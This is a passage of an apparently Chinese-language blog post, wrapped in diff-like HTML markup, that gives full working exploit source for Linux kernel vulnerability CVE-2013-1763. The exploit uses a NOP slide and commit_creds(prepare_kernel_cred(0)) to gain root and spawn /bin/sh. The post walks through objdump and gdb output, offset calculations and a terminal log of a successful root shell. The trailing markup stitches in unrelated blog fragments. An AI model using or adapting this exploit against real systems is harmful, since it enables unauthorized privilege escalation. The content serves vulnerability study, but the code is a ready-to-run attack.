class="meta-string">&lt;linux/unix_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sock_diag_handlers, nl_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))    <span class="comment">//这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。</span></span><br><span class="line">kernel_code()</span><br><span class="line">&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));  <span class="comment">//这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这段函数没有使用，用来解释hard code jump[] 为什么是那些数值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump_payload_not_used</span><span class="params">(<span class="keyword">void</span> *skb, <span class="keyword">void</span> *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov $kernel_code, %eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"call *%eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span></span><br><span class="line">get_symbol(<span class="keyword">char</span> *name)  <span class="comment">//为了获取内核函数地址</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *f;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line">  <span class="keyword">char</span> dummy, sym[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  f = fopen(<span class="string">"/proc/kallsyms"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">while</span> (ret != EOF) &#123;</span><br><span class="line">    ret = <span class="built_in">fscanf</span>(f, <span class="string">"%p %c %s\n"</span>, (<span class="keyword">void</span> **) &amp;addr, &amp;dummy, sym);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">fscanf</span>(f, <span class="string">"%s\n"</span>, sym);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, sym)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] resolved symbol %s to %p\n"</span>, name, (<span class="keyword">void</span> *) addr);</span><br><span class="line">      fclose(f);</span><br><span class="line">      <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">unsigned</span> family;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> <span class="title">nlh</span>;</span>  <span class="comment">//socket协议netlink数据包的格式</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unix_diag_req</span> <span class="title">r</span>;</span></span><br><span class="line">  &#125; req;</span><br><span class="line">  <span class="keyword">char</span>  buf[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个netlink协议的socket，因为__sock_diag_rcv_msg函数是属于NETLINK_SOCK_DIAG的</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't create sock diag socket\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//填充数据包，就是为了最终能够执行到__sock_diag_rcv_msg中去</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">  req.nlh.nlmsg_len = <span class="keyword">sizeof</span>(req);</span><br><span class="line">  req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;</span><br><span class="line">  req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;</span><br><span class="line">  req.nlh.nlmsg_seq = <span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//req.r.sdiag_family = 89;</span></span><br><span class="line">  req.r.udiag_states = <span class="number">-1</span>;</span><br><span class="line">  req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Run: %s Fedora|Ubuntu\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"Fedora"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    commit_creds = (_commit_creds) get_symbol(<span class="string">"commit_creds"</span>);</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(<span class="string">"prepare_kernel_cred"</span>);</span><br><span class="line">    sock_diag_handlers = get_symbol(<span class="string">"sock_diag_handlers"</span>);</span><br><span class="line">    nl_table = get_symbol(<span class="string">"nl_table"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"some symbols are not available!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    family = (nl_table - sock_diag_handlers) / <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"family=%d\n"</span>,family);</span><br><span class="line">    req.r.sdiag_family = family;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(family&gt;<span class="number">255</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nl_table is too far!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"Ubuntu"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">    commit_creds = (_commit_creds) <span class="number">0xc106bc60</span>;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) <span class="number">0xc106bea0</span>;</span><br><span class="line">    req.r.sdiag_family = <span class="number">81</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_start, mmap_size;</span><br><span class="line">  mmap_start = <span class="number">0x10000</span>;  <span class="comment">//选择了一块1MB多的内存区域</span></span><br><span class="line">  mmap_size = <span class="number">0x120000</span>;  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"mmapping at 0x%lx, size = 0x%lx\n"</span>, mmap_start, mmap_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mmap((<span class="keyword">void</span>*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">                MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == MAP_FAILED) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"mmap fault\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)mmap_start, <span class="number">0x90</span>, mmap_size);         <span class="comment">//将其全部填充为0x90，在X86系统中对应的是NOP指令</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> jump[] = <span class="string">"\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"</span>; <span class="comment">// jump_payload in asm</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *asd = &amp;jump[<span class="number">4</span>];</span><br><span class="line">  *asd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kernel_code; <span class="comment">//使用kernel_code函数的地址替换掉jump[]中的0x11</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将jump这段代码放在mmap内存区域的最后，也就是说只要最后能够跳转到这块区域，就可以执行到jump代码，进而跳转执行kernel_code，因为这块区域中布满了NOP指令。</span></span><br><span class="line">  <span class="built_in">memcpy</span>( (<span class="keyword">void</span>*)mmap_start+mmap_size-<span class="keyword">sizeof</span>(jump), jump, <span class="keyword">sizeof</span>(jump));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有准备工作完成之后，最后在这里发送socket触发这个漏洞</span></span><br><span class="line">  <span class="keyword">if</span> ( send(fd, &amp;req, <span class="keyword">sizeof</span>(req), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bad send\n"</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"uid=%d, euid=%d\n"</span>,getuid(), geteuid() );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!getuid())</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="6-exploit代码分析"><a href="#6-exploit代码分析" class="headerlink" title="6. exploit代码分析"></a>6. exploit代码分析</h2><p>在分析之前，有些概念要澄清一下，在linux系统中，用户空间和内核空间是独立存在的。在一个32位的linux系统中，每个进程会虚拟出4G的内存空间，其中3G是用户空间，1G是内核空间，用户空间的地址范围是0&times;00000000 到 0xBFFFFFFF，内核空间的地址是0xC0000000 到 0xFFFFFFFF。内核地址空间由所有进程共享，但只有运行在内核态的进程才能访问，用户进程可以通过系统调用切换到内核态访问内核空间，进程运行在内核态时所产生的地址都属于内核空间。<code>commit_creds</code>和<code>prepare_kernel_cred</code>均为内核函数，如果要执行他们就应该切换到内核状态运行。当执行内核函数<code>__sock_diag_rcv_msg</code>是处于内核态的，所以这个时候调用执行kernel_code函数就可以取得root权限。</p>
+<p>那么如何调用kernel_code函数呢？所有我们mmap了一块从0x10000开始0x120000大小的内存空间，然后将这块空间写满NOP指令，将跳转执行kernel_code的代码放在这块区域的最后面，也就是说，只要跳转执行到这块内存区域的（除了jump代码块内部）都会顺利跑到kernel_code函数。这种方法叫做<strong>NOP slide</strong>，就像坐滑滑梯一样，自然滑到底部。jump这一段代码的分析如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> jump[] = <span class="string">"\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"</span>; <span class="comment">// jump_payload in asm</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *asd = &amp;jump[<span class="number">4</span>];</span><br><span class="line">  *asd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kernel_code;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump_payload_not_used</span><span class="params">(<span class="keyword">void</span> *skb, <span class="keyword">void</span> *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov $kernel_code, %eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"call *%eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ gcc CVE<span class="number">-2013</span><span class="number">-1763.</span>c</span><br><span class="line">CVE<span class="number">-2013</span><span class="number">-1763.</span>c: In function ‘main’:</span><br><span class="line">CVE<span class="number">-2013</span><span class="number">-1763.</span>c:<span class="number">148</span>:<span class="number">26</span>: warning: initialization from incompatible pointer type [enabled by <span class="keyword">default</span>]</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ objdump -D a.out</span><br><span class="line">….</span><br><span class="line"><span class="number">08048763</span> &lt;jump_payload_not_used&gt;:</span><br><span class="line"> <span class="number">8048763</span>:  <span class="number">55</span>                     push   %ebp</span><br><span class="line"> <span class="number">8048764</span>:  <span class="number">89</span> e5                  mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048766</span>:  b8 <span class="number">3</span>c <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>         mov    $<span class="number">0x804873c</span>,%eax</span><br><span class="line"> <span class="number">804876b</span>:  ff d0                  call   *%eax</span><br><span class="line"> <span class="number">804876</span>d:  <span class="number">5</span>d                     pop    %ebp</span><br><span class="line"> <span class="number">804876</span>e:  c3                     ret   </span><br><span class="line">….</span><br><span class="line"></span><br><span class="line">(gdb) p/x jump</span><br><span class="line">$<span class="number">2</span> = &#123;<span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0xb8</span>, <span class="number">0x3c</span>, <span class="number">0x87</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x5d</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>&#125; <span class="comment">//最后发现0x11被填充成了kernel_code的地址</span></span><br><span class="line">(gdb) p kernel_code</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="keyword">int</span> ()&#125; <span class="number">0x804873c</span> &lt;kernel_code&gt;</span><br></pre></td></tr></table></figure></p>
+<p>问题的关键变成了如何才能跳转到这一块内存区域呢？先看看下面这结构体的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">      __u32       nlmsg_len;  <span class="comment">/* Length of message including header */</span></span><br><span class="line">      __u16       nlmsg_type; <span class="comment">/* Message content */</span></span><br><span class="line">      __u16       nlmsg_flags;    <span class="comment">/* Additional flags */</span></span><br><span class="line">      __u32       nlmsg_seq;  <span class="comment">/* Sequence number */</span></span><br><span class="line">      __u32       nlmsg_pid;  <span class="comment">/* Sending process port ID */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unix_diag_req</span> &#123;</span></span><br><span class="line">      __u8    sdiag_family;</span><br><span class="line">      __u8    sdiag_protocol;</span><br><span class="line">      __u16   pad;</span><br><span class="line">      __u32   udiag_states;</span><br><span class="line">      __u32   udiag_ino;</span><br><span class="line">      __u32   udiag_show;</span><br><span class="line">      __u32   udiag_cookie[<span class="number">2</span>];</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> &#123;</span></span><br><span class="line">        __u8 family;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">int</span> (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">netlink_table</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">nl_portid_hash</span>   <span class="title">hash</span>;</span> <span class="comment">//取回这个值</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>       <span class="title">mc_list</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">listeners</span> __<span class="title">rcu</span>  *<span class="title">listeners</span>;</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            flags;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            groups;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>            *<span class="title">cb_mutex</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">module</span>           *<span class="title">module</span>;</span></span><br><span class="line">         <span class="keyword">void</span>                    (*bind)(<span class="keyword">int</span> group);</span><br><span class="line">         <span class="keyword">int</span>                     registered;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">nl_portid_hash</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>       *<span class="title">table</span>;</span> <span class="comment">//四个字节</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">long</span>           rehash_time; <span class="comment">//也是四个字节.0x00012b59//这个值在我们的那个范围内.</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            mask;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            shift;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            entries;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            max_shift;</span><br><span class="line"> </span><br><span class="line">         u32                     rnd;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">netlink_table</span> *<span class="title">nl_table</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>我们的牛人发现了nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内，所以可以利用这个值来跳转，只需要将<code>sock_diag_handlers[sdiag_family]-dump</code>正好落在这个值上就可以了。如下图所示</p>
+<p>所以我们需要先知道<code>nl_table</code>和<code>sock_diag_handlers</code>的地址，可以通过以下两种方式查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms</span><br><span class="line">sudo cat /boot/System.map-3.2.0-43-generic-pae</span><br></pre></td></tr></table></figure></p>
+<p>但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于<code>nl_table</code>和 <code>sock_diag_handlers</code>都是指针，所以他们的大小都是4个字节。于是就可以计算出<code>sdiag_family</code>的取值了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table</span><br><span class="line">c189b5c0 d nl_table_lock</span><br><span class="line">c189b5c4 d nl_table_wait</span><br><span class="line">c1a488e0 b nl_table_users</span><br><span class="line">c1a488e4 b nl_table</span><br><span class="line">fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers</span><br><span class="line">c1a487a0 b sock_diag_handlers</span><br><span class="line">(0xc1a488e4 - 0xc1a487a0) / 4 = 81L</span><br></pre></td></tr></table></figure></p>
+<p>至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c</span><br><span class="line">CVE-2013-1763.c: In function ‘main’:</span><br><span class="line">CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ id</span><br><span class="line">uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu</span><br><span class="line">mmapping at 0x10000, size = 0x120000</span><br><span class="line">uid=0, euid=0</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
+<p>由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行 mutex_unlock(&amp;sock_diag_table_mutex)，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。</p>
+<h2 id="7-参考网站"><a href="#7-参考网站" class="headerlink" title="7. 参考网站"></a>7. 参考网站</h2><p>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename…=CVE-2013-1763</a><br>NVD: <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/de…=CVE-2013-1763</a><br>Patch: CONFIRM:<a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">http://git.kernel.org/?p=linux/kerne…e0b6894ffd79c0</a><br>Exploit: <a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a><br>维基百科Netlink：<a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink</a> </p>
+
+          
+        
+      
     </div>
-</aside>
-<div class="post">
-    <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对博客的理解"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于叶落阁"><span class="toc-text">关于叶落阁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#博客平台"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
     
-<style>
-    .left-col .switch-btn,
-    .left-col .switch-area {
-        display: none;
-    }
-    .toc-level-3 i,
-    .toc-level-3 ol {
-        display: none !important;
-    }
-</style>
-</div>
-            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
-<blockquote>
-<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
-<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
-<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
-</blockquote>
-<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
-<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
-<h2 id="关于叶落阁"><a href="#关于叶落阁" class="headerlink" title="关于叶落阁"></a>关于叶落阁</h2><p><strong>叶落阁</strong> 是阿杰（杨玉杰）的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a href="https://hexo.io/">Hexo</a> 生成，部署在 <a href="https://pages.github.com/">GitHub Pages</a>，主题 <a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
-<p>主要功能：</p>
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2014/04/20/在ubuntu上安装redmine/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2014/04/20/在ubuntu上安装redmine/" itemprop="url">在ubuntu上安装redmine</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-04-20T16:33:52+08:00">
+                2014-04-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/其他/" itemprop="url" rel="index">
+                    <span itemprop="name">其他</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
